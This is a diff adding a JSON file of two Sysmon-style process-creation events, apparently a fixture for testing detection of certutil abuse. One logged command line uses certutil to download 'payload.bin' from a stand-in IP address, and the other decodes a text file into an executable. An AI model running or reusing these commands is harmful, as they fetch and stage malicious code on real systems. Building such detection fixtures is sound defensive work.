@@ -1,0 +1,14 @@
+[
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.10/payload.bin C:\\Users\\Public\\p.bin",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -decode C:\\Users\\Public\\enc.txt C:\\Users\\Public\\out.exe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  }
+]
